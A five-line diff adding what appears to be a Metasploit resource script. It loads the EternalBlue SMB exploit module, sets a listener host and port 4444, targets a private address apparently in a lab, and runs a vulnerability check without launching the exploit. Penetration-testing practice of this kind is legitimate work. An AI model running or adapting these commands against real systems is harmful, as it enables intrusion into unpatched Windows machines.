@@ -1,0 +1,5 @@
+use exploit/windows/smb/ms17_010_eternalblue 
+set LHOST 192.168.52.131
+set LPORT 4444
+set RHOST 192.168.52.131
+check
